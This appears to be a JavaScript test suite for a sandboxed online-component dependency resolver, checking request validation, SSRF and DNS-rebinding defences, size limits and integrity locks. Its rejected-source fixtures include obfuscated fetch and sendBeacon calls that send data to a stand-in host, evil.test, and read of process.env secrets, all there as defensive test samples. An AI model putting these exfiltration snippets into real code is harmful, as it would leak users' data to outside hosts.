import assert from 'node:assert/strict'
import { mkdtemp, readFile, readdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import test from 'node:test'

import {
  ONLINE_COMPONENT_DEPENDENCY_ROUTE,
  createEnvironmentOnlineComponentDependencyHandler,
  createOnlineComponentDependencyHandler,
} from '../server/online-components/index.mjs'

const REGISTRY_ORIGIN = 'https://registry.example.test'
const CDN_ORIGIN = 'https://cdn.example.test'
const REQUEST_ORIGIN = 'https://dashboard.example.test'
const SOURCE = 'export default function Component() { return null }'

const requestBody = (overrides = {}) => ({ package: '@scope/chart-card', range: '^1.2.0', ...overrides })
const proxyRequest = (body = requestBody(), overrides = {}) => ({
  method: 'POST',
  path: ONLINE_COMPONENT_DEPENDENCY_ROUTE,
  headers: { 'content-type': 'application/json', origin: REQUEST_ORIGIN },
  expectedOrigins: [REQUEST_ORIGIN],
  body: JSON.stringify(body),
  ...overrides,
})
const jsonResponse = (value, overrides = {}) => ({
  status: 200,
  headers: { 'content-type': 'application/json; charset=utf-8' },
  body: Buffer.from(JSON.stringify(value)),
  ...overrides,
})
const moduleResponse = (source = SOURCE, overrides = {}) => ({
  status: 200,
  headers: { 'content-type': 'text/javascript; charset=utf-8' },
  body: Buffer.from(source),
  ...overrides,
})
const metadata = (overrides = {}) => ({
  exactVersion: '1.2.3',
  bundleUrl: `${CDN_ORIGIN}/@scope/chart-card@1.2.3/index.mjs`,
  format: 'bundled-esm',
  installScripts: false,
  ...overrides,
})
const config = cacheDir => ({
  registryOrigins: [REGISTRY_ORIGIN],
  cdnOrigins: [CDN_ORIGIN],
  cacheDir,
  limits: { maxMetadataBytes: 4096, maxBundleBytes: 8192, maxRedirects: 2, timeoutMs: 100 },
})
const publicLookup = async () => [{ address: '93.184.216.34', family: 4 }]

const createHarness = async (t, options = {}) => {
  const cacheDir = options.cacheDir ?? (await mkdtemp(join(tmpdir(), 'easy-editor-dependency-')))
  if (!options.cacheDir) t.after(() => rm(cacheDir, { recursive: true, force: true }))
  const calls = []
  const transportImplementation =
    options.transport ?? (async request => (request.kind === 'registry' ? jsonResponse(metadata()) : moduleResponse()))
  const transport = async request => {
    calls.push(request)
    const response = await transportImplementation(request)
    return options.omitTransportProof
      ? response
      : { url: request.url.href, remoteAddress: '93.184.216.34', ...response }
  }
  return {
    cacheDir,
    calls,
    handler: createOnlineComponentDependencyHandler({
      config: config(cacheDir),
      lookup: options.lookup ?? publicLookup,
      transport,
      totalTimeoutMs: options.totalTimeoutMs,
    }),
  }
}

test('dependency endpoint is default-off with an explicit safe 503', async () => {
  const handler = createEnvironmentOnlineComponentDependencyHandler({ env: {} })
  assert.deepEqual(await handler.handle(proxyRequest()), {
    status: 503,
    body: {
      schemaVersion: 1,
      error: {
        code: 'dependency-unavailable',
        message: 'Online component dependency resolver is unavailable',
        retryable: true,
      },
    },
  })
})

test('enabled dependency endpoint still fails closed when environment configuration is absent or invalid', async () => {
  const invalidEnvironments = [
    { EASY_EDITOR_ONLINE_COMPONENT_DEPENDENCY_ENABLED: '1' },
    {
      EASY_EDITOR_ONLINE_COMPONENT_DEPENDENCY_ENABLED: '1',
      EASY_EDITOR_ONLINE_COMPONENT_DEPENDENCY_CONFIG_JSON: '{',
    },
    {
      EASY_EDITOR_ONLINE_COMPONENT_DEPENDENCY_ENABLED: '1',
      EASY_EDITOR_ONLINE_COMPONENT_DEPENDENCY_CONFIG_JSON: JSON.stringify({
        registryOrigins: ['http://registry.example.test'],
        cdnOrigins: [CDN_ORIGIN],
        cacheDir: 'relative/cache',
      }),
    },
    {
      EASY_EDITOR_ONLINE_COMPONENT_DEPENDENCY_ENABLED: '1',
      EASY_EDITOR_ONLINE_COMPONENT_DEPENDENCY_CONFIG_JSON: JSON.stringify({
        registryOrigins: [REGISTRY_ORIGIN],
        cdnOrigins: [CDN_ORIGIN],
        cacheDir: join(tmpdir(), 'easy-editor-dependency-invalid-config'),
        unexpectedAuthority: 'https://evil.test',
      }),
    },
  ]

  for (const env of invalidEnvironments) {
    let lookupCalls = 0
    let transportCalls = 0
    const handler = createEnvironmentOnlineComponentDependencyHandler({
      env,
      lookup: async () => {
        lookupCalls += 1
        return [{ address: '93.184.216.34', family: 4 }]
      },
      transport: async () => {
        transportCalls += 1
        return jsonResponse(metadata())
      },
    })
    const result = await handler.handle(proxyRequest())
    assert.equal(result.status, 503)
    assert.equal(result.body.error.code, 'dependency-unavailable')
    assert.equal(lookupCalls, 0)
    assert.equal(transportCalls, 0)
  }
})

test('dependency endpoint accepts only strict same-origin POST JSON package and range input', async t => {
  const { handler, calls } = await createHarness(t)
  const invalidRequests = [
    proxyRequest(requestBody(), { method: 'GET' }),
    proxyRequest(requestBody(), { path: '/api/online-components/dependencies/other' }),
    proxyRequest(requestBody(), { headers: { 'content-type': 'text/plain', origin: REQUEST_ORIGIN } }),
    proxyRequest(requestBody(), { headers: { 'content-type': 'application/json', origin: 'https://evil.test' } }),
    proxyRequest({ package: '@scope/chart-card', range: '^1.2.0', url: 'https://evil.test/module.mjs' }),
    proxyRequest({ package: '../escape', range: '^1.2.0' }),
    proxyRequest({ package: '@scope/chart-card', range: 'latest' }),
    proxyRequest({ package: '@scope/chart-card', range: '^1.2.0 || *' }),
    proxyRequest(undefined, { body: '{' }),
  ]
  for (const request of invalidRequests) {
    const result = await handler.handle(request)
    assert.ok([400, 403, 404, 405, 415].includes(result.status), JSON.stringify(result))
    assert.equal(result.body.error.code, 'invalid-request')
  }
  assert.equal(calls.length, 0)
})

test('package names are open while only frozen registry and CDN URLs are constructed', async t => {
  const { handler, calls } = await createHarness(t)
  const result = await handler.handle(proxyRequest({ package: 'customer-unlisted-widget', range: '~1.2.0' }))

  assert.equal(result.status, 200)
  assert.equal(result.body.dependency.package, 'customer-unlisted-widget')
  assert.equal(result.body.dependency.range, '~1.2.0')
  assert.equal(result.body.dependency.exactVersion, '1.2.3')
  assert.equal(result.body.dependency.finalUrl, metadata().bundleUrl)
  assert.match(result.body.dependency.integrity, /^sha256-[A-Za-z0-9+/]{43}=$/)
  assert.equal(result.body.dependency.cached, false)
  assert.deepEqual(result.body.dependency.module, {
    format: 'bundled-esm',
    contentType: 'text/javascript',
    encoding: 'base64',
    byteLength: Buffer.byteLength(SOURCE),
    bytes: Buffer.from(SOURCE).toString('base64'),
  })
  assert.equal(calls.length, 2)
  assert.equal(calls[0].kind, 'registry')
  assert.equal(calls[0].url.origin, REGISTRY_ORIGIN)
  assert.match(calls[0].url.pathname, /^\/v1\/resolve\//)
  assert.equal(calls[0].headers.authorization, undefined)
  assert.equal(calls[1].kind, 'bundle')
  assert.equal(calls[1].url.origin, CDN_ORIGIN)
  assert.equal(calls[1].headers.authorization, undefined)
})

test('destinations and redirects revalidate HTTPS origin, port, DNS, and actual peer', async t => {
  for (const lookup of [
    async () => [{ address: '0.0.0.0', family: 4 }],
    async () => [{ address: '127.0.0.1', family: 4 }],
    async () => [{ address: '100.64.0.1', family: 4 }],
    async () => [{ address: '169.254.169.254', family: 4 }],
    async () => [{ address: '10.1.2.3', family: 4 }],
    async () => [{ address: '172.16.0.1', family: 4 }],
    async () => [{ address: '192.168.1.1', family: 4 }],
    async () => [{ address: '168.63.129.16', family: 4 }],
    async () => [{ address: '::', family: 6 }],
    async () => [{ address: '::1', family: 6 }],
    async () => [{ address: 'fe80::1', family: 6 }],
    async () => [{ address: 'fc00::1', family: 6 }],
    async () => [{ address: 'ff02::1', family: 6 }],
    async () => [{ address: '::ffff:169.254.169.254', family: 6 }],
    async () => [{ address: '64:ff9b:1::a9fe:a9fe', family: 6 }],
    async () => [{ address: '2002:a9fe:a9fe::1', family: 6 }],
    async () => [{ address: '2001:0000:4136:e378:8000:63bf:3fff:fdd2', family: 6 }],
  ]) {
    const { handler } = await createHarness(t, { lookup })
    const result = await handler.handle(proxyRequest())
    assert.equal(result.status, 403)
    assert.equal(result.body.error.code, 'destination-denied')
  }

  const cases = [
    async request =>
      request.kind === 'registry'
        ? jsonResponse({}, { status: 302, headers: { location: 'https://evil.example/v1/resolve/pkg' } })
        : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse({}, { status: 302, headers: { location: 'http://registry.example.test/v1/resolve/pkg' } })
        : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata({ bundleUrl: 'https://evil.example/module.mjs' }))
        : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata({ bundleUrl: 'http://cdn.example.test/module.mjs' }))
        : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata({ bundleUrl: 'https://cdn.example.test:444/module.mjs' }))
        : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata(), { url: 'https://registry.example.test.evil/v1/resolve/pkg' })
        : moduleResponse(),
    async request =>
      request.kind === 'registry' ? jsonResponse(metadata(), { remoteAddress: '93.184.216.35' }) : moduleResponse(),
  ]
  for (const transport of cases) {
    const { handler } = await createHarness(t, { transport })
    const result = await handler.handle(proxyRequest())
    assert.equal(result.status, 403)
    assert.equal(result.body.error.code, 'destination-denied')
  }

  const missingProof = await createHarness(t, { omitTransportProof: true })
  const deniedMissingProof = await missingProof.handler.handle(proxyRequest())
  assert.equal(deniedMissingProof.status, 403)
  assert.equal(deniedMissingProof.body.error.code, 'destination-denied')
})

test('literal private origins are denied before transport while a pinned public IPv6 peer is supported', async t => {
  const privateRegistryCache = await mkdtemp(join(tmpdir(), 'easy-editor-private-registry-'))
  t.after(() => rm(privateRegistryCache, { recursive: true, force: true }))
  let directTransportCalls = 0
  const privateRegistry = createOnlineComponentDependencyHandler({
    config: {
      ...config(privateRegistryCache),
      registryOrigins: ['https://127.0.0.1'],
    },
    lookup: async () => {
      throw new Error('literal IP origins must not use external DNS')
    },
    transport: async () => {
      directTransportCalls += 1
      return jsonResponse(metadata())
    },
  })
  const privateRegistryResult = await privateRegistry.handle(proxyRequest())
  assert.equal(privateRegistryResult.status, 403)
  assert.equal(privateRegistryResult.body.error.code, 'destination-denied')
  assert.equal(directTransportCalls, 0)

  const privateCdnCache = await mkdtemp(join(tmpdir(), 'easy-editor-private-cdn-'))
  t.after(() => rm(privateCdnCache, { recursive: true, force: true }))
  let privateCdnCalls = 0
  const privateCdn = createOnlineComponentDependencyHandler({
    config: {
      ...config(privateCdnCache),
      cdnOrigins: ['https://[::1]'],
    },
    lookup: publicLookup,
    transport: async request => {
      privateCdnCalls += 1
      return {
        url: request.url.href,
        remoteAddress: '93.184.216.34',
        ...jsonResponse(metadata({ bundleUrl: 'https://[::1]/private.mjs' })),
      }
    },
  })
  const privateCdnResult = await privateCdn.handle(proxyRequest())
  assert.equal(privateCdnResult.status, 403)
  assert.equal(privateCdnResult.body.error.code, 'destination-denied')
  assert.equal(privateCdnCalls, 1)

  const publicIpv6Cache = await mkdtemp(join(tmpdir(), 'easy-editor-public-ipv6-'))
  t.after(() => rm(publicIpv6Cache, { recursive: true, force: true }))
  const publicIpv6 = createOnlineComponentDependencyHandler({
    config: config(publicIpv6Cache),
    lookup: async () => [{ address: '2606:4700:4700::1111', family: 6 }],
    transport: async request => ({
      url: request.url.href,
      remoteAddress: '2606:4700:4700:0:0:0:0:1111',
      ...(request.kind === 'registry' ? jsonResponse(metadata()) : moduleResponse()),
    }),
  })
  assert.equal((await publicIpv6.handle(proxyRequest())).status, 200)
})

test('allowed redirects re-resolve DNS at every hop and lock the final URL', async t => {
  let lookupCalls = 0
  const { handler } = await createHarness(t, {
    lookup: async () => {
      lookupCalls += 1
      return [{ address: '93.184.216.34', family: 4 }]
    },
    transport: async request => {
      if (request.kind === 'registry') {
        return jsonResponse(metadata({ bundleUrl: `${CDN_ORIGIN}/start.mjs` }))
      }
      if (request.url.pathname === '/start.mjs') {
        return moduleResponse('', { status: 302, headers: { location: '/final.mjs' } })
      }
      return moduleResponse()
    },
  })
  const result = await handler.handle(proxyRequest())
  assert.equal(result.status, 200)
  assert.equal(result.body.dependency.finalUrl, `${CDN_ORIGIN}/final.mjs`)
  assert.equal(lookupCalls, 3)

  let rebindingLookupCalls = 0
  const rebinding = await createHarness(t, {
    lookup: async () => {
      rebindingLookupCalls += 1
      return [
        {
          address: rebindingLookupCalls === 3 ? '127.0.0.1' : '93.184.216.34',
          family: 4,
        },
      ]
    },
    transport: async request => {
      if (request.kind === 'registry') {
        return jsonResponse(metadata({ bundleUrl: `${CDN_ORIGIN}/start.mjs` }))
      }
      return moduleResponse('', { status: 302, headers: { location: '/final.mjs' } })
    },
  })
  const denied = await rebinding.handler.handle(proxyRequest())
  assert.equal(denied.status, 403)
  assert.equal(denied.body.error.code, 'destination-denied')
  assert.equal(rebindingLookupCalls, 3)
})

test('content type, bytes, UTF-8, redirect, and deadline budgets fail closed', async t => {
  const cases = [
    async request =>
      request.kind === 'registry' ? jsonResponse(metadata({ exactVersion: '9.0.0' })) : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata(), { headers: { 'content-type': 'text/html' } })
        : moduleResponse(),
    async request =>
      request.kind === 'registry' ? jsonResponse({ ...metadata(), padding: 'x'.repeat(5000) }) : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata())
        : moduleResponse(SOURCE, { headers: { 'content-type': 'text/html' } }),
    async request => (request.kind === 'registry' ? jsonResponse(metadata()) : moduleResponse('x'.repeat(9000))),
    async request =>
      request.kind === 'registry' ? jsonResponse(metadata()) : moduleResponse(undefined, { body: Buffer.from([0xff]) }),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata())
        : moduleResponse('', { status: 302, headers: { location: `${CDN_ORIGIN}/one.mjs` } }),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(
            {},
            {
              status: 302,
              headers: { location: `${REGISTRY_ORIGIN}/v1/next` },
              body: Buffer.alloc(4097),
            },
          )
        : moduleResponse(),
    async request =>
      request.kind === 'registry'
        ? jsonResponse(metadata({ integrity: `sha256-${Buffer.alloc(32, 1).toString('base64')}` }))
        : moduleResponse(),
  ]
  for (const transport of cases) {
    const { handler } = await createHarness(t, { transport })
    const result = await handler.handle(proxyRequest())
    assert.equal(result.status, 502)
    assert.equal(result.body.error.code, 'upstream-response-invalid')
  }

  const timeoutHarness = await createHarness(t, {
    totalTimeoutMs: 10,
    transport: async () => new Promise(() => {}),
  })
  const timeout = await timeoutHarness.handler.handle(proxyRequest())
  assert.equal(timeout.status, 504)
  assert.equal(timeout.body.error.code, 'upstream-timeout')

  const budgetHarness = await createHarness(t, {
    transport: async request => {
      assert.equal(request.maxBytes, request.kind === 'registry' ? 4096 : 8192)
      return request.kind === 'registry' ? jsonResponse(metadata()) : moduleResponse()
    },
  })
  assert.equal((await budgetHarness.handler.handle(proxyRequest())).status, 200)
})

test('uncached network and DNS outages return a stable retryable diagnostic', async t => {
  const transportOffline = await createHarness(t, {
    transport: async () => {
      throw new Error('secret transport detail')
    },
  })
  const transportResult = await transportOffline.handler.handle(proxyRequest())
  assert.equal(transportResult.status, 502)
  assert.deepEqual(transportResult.body.error, {
    code: 'upstream-failed',
    message: 'Upstream request failed',
    retryable: true,
  })
  assert.doesNotMatch(JSON.stringify(transportResult), /secret transport detail/)

  const dnsOffline = await createHarness(t, {
    lookup: async () => {
      throw Object.assign(new Error('secret DNS detail'), { code: 'ENOTFOUND' })
    },
  })
  const dnsResult = await dnsOffline.handler.handle(proxyRequest())
  assert.equal(dnsResult.status, 502)
  assert.equal(dnsResult.body.error.code, 'upstream-failed')
  assert.doesNotMatch(JSON.stringify(dnsResult), /secret DNS detail/)
})

test('only self-contained bundled ESM without install scripts, imports, Node globals, or network APIs is accepted', async t => {
  const rejectedSources = [
    "import fs from 'node:fs'; export default fs",
    "import React from 'react'; export default React",
    "export default import('./chunk.mjs')",
    "export { value } from './chunk.mjs'",
    "export { default } from 'react'",
    "export * from 'node:fs'",
    "const fs = require('fs'); export default fs",
    "export default () => fetch('https://evil.test')",
    "export default () => globalThis['fe' + 'tch']('https://evil.test')",
    "export default () => globalThis['\\x66etch']('https://evil.test')",
    "export default () => window?.['fe' + 'tch']('https://evil.test')",
    'export default () => globalThis[`fetch`]("https://evil.test")',
    "export default () => ({})['constructor']('return fetch')()",
    "const f\\u0065tch = () => null; export default fetch('https://evil.test')",
    'export default () => new XMLHttpRequest()',
    "export default () => navigator.sendBeacon('https://evil.test', 'secret')",
    "export default () => new WebTransport('https://evil.test')",
    'export default process.env.SECRET',
    "export default Function('return fetch')()",
    "export default () => `${fetch('https://evil.test')}`",
    'const value = 1',
  ]
  for (const source of rejectedSources) {
    const { handler } = await createHarness(t, {
      transport: async request => (request.kind === 'registry' ? jsonResponse(metadata()) : moduleResponse(source)),
    })
    const result = await handler.handle(proxyRequest())
    assert.equal(result.status, 502, source)
    assert.equal(result.body.error.code, 'upstream-response-invalid')
  }

  const { handler } = await createHarness(t, {
    transport: async request =>
      request.kind === 'registry' ? jsonResponse(metadata({ installScripts: true })) : moduleResponse(),
  })
  assert.equal((await handler.handle(proxyRequest())).body.error.code, 'upstream-response-invalid')

  const inertSyntaxSource = [
    "// import fs from 'node:fs'; fetch('https://comment.example')",
    "/* export { value } from 'react'; process.exit() */",
    'const matcher = /fetch|import|process|require/gi',
    "const inertTemplate = `import('x'); fetch('https://template.example'); \\${notAnExpression}`",
    'export default function Component() {',
    "  return [\"require('fs') process Buffer fetch\", inertTemplate, matcher.source, `${'fetch process import'}`]",
    '}',
  ].join('\n')
  const parserHarness = await createHarness(t, {
    transport: async request =>
      request.kind === 'registry' ? jsonResponse(metadata()) : moduleResponse(inertSyntaxSource),
  })
  assert.equal((await parserHarness.handler.handle(proxyRequest())).status, 200)
})

test('exact locks recover offline and reject version, final URL, or hash drift', async t => {
  const cacheDir = await mkdtemp(join(tmpdir(), 'easy-editor-dependency-lock-'))
  t.after(() => rm(cacheDir, { recursive: true, force: true }))
  const first = await createHarness(t, { cacheDir })
  const initial = await first.handler.handle(proxyRequest())
  assert.equal(initial.status, 200)

  const abortController = new AbortController()
  abortController.abort(new Error('client abort detail'))
  const abortedHarness = await createHarness(t, {
    cacheDir,
    transport: async () => {
      throw new Error('transport must not run for an aborted request')
    },
  })
  const aborted = await abortedHarness.handler.handle(proxyRequest(requestBody(), { signal: abortController.signal }))
  assert.equal(aborted.status, 408)
  assert.equal(aborted.body.error.code, 'request-aborted')
  assert.doesNotMatch(JSON.stringify(aborted), /client abort detail/)

  const offline = await createHarness(t, {
    cacheDir,
    transport: async () => {
      throw new Error('offline upstream secret detail')
    },
  })
  const recovered = await offline.handler.handle(proxyRequest())
  assert.equal(recovered.status, 200)
  assert.equal(recovered.body.dependency.cached, true)
  assert.deepEqual({ ...recovered.body.dependency, cached: false }, initial.body.dependency)
  assert.doesNotMatch(JSON.stringify(recovered), /offline upstream secret detail/)

  const dnsOffline = await createHarness(t, {
    cacheDir,
    lookup: async () => {
      throw Object.assign(new Error('DNS is offline'), { code: 'ENOTFOUND' })
    },
    transport: async () => {
      throw new Error('transport must not run when DNS resolution failed')
    },
  })
  const dnsRecovered = await dnsOffline.handler.handle(proxyRequest())
  assert.equal(dnsRecovered.status, 200)
  assert.equal(dnsRecovered.body.dependency.cached, true)

  const forbiddenEvenWithCache = await createHarness(t, {
    cacheDir,
    lookup: async () => [{ address: '169.254.169.254', family: 4 }],
    transport: async () => {
      throw new Error('transport must not run for a forbidden destination')
    },
  })
  const forbiddenResult = await forbiddenEvenWithCache.handler.handle(proxyRequest())
  assert.equal(forbiddenResult.status, 403)
  assert.equal(forbiddenResult.body.error.code, 'destination-denied')

  const driftCases = [
    { metadata: metadata({ exactVersion: '1.2.4' }), source: undefined },
    { metadata: metadata({ bundleUrl: `${CDN_ORIGIN}/other.mjs` }), source: undefined },
    { metadata: metadata(), source: 'export default function Changed() { return 2 }' },
  ]
  for (const drift of driftCases) {
    const harness = await createHarness(t, {
      cacheDir,
      transport: async request =>
        request.kind === 'registry' ? jsonResponse(drift.metadata) : moduleResponse(drift.source),
    })
    const result = await harness.handler.handle(proxyRequest())
    assert.equal(result.status, 409)
    assert.equal(result.body.error.code, 'dependency-lock-drift')
  }

  const [cacheFile] = await readdir(cacheDir)
  const cachePath = join(cacheDir, cacheFile)
  const tampered = JSON.parse(await readFile(cachePath, 'utf8'))
  tampered.bytes = Buffer.from('export default 99').toString('base64')
  await writeFile(cachePath, JSON.stringify(tampered))
  const tamperedHarness = await createHarness(t, {
    cacheDir,
    transport: async () => {
      throw new Error('network must not be consulted for a corrupt lock')
    },
  })
  const tamperedResult = await tamperedHarness.handler.handle(proxyRequest())
  assert.equal(tamperedResult.status, 409)
  assert.equal(tamperedResult.body.error.code, 'dependency-lock-drift')
})
